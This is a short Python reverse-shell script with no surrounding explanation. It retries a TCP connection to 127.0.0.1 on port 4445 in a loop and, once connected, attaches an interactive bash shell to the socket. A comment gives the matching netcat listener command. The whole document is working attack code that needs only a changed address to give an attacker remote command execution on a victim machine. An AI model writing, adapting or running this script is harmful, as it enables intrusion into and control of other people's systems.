# nc -lvnp 4445
import socket, os, subprocess, time

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print("Trying to connect")
		s.connect(("127.0.0.1", 4445))
		print("Spawning shell")
		subprocess.call(["/bin/bash", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
		exit(1)
	except Exception as e:
		print(e)
		time.sleep(1)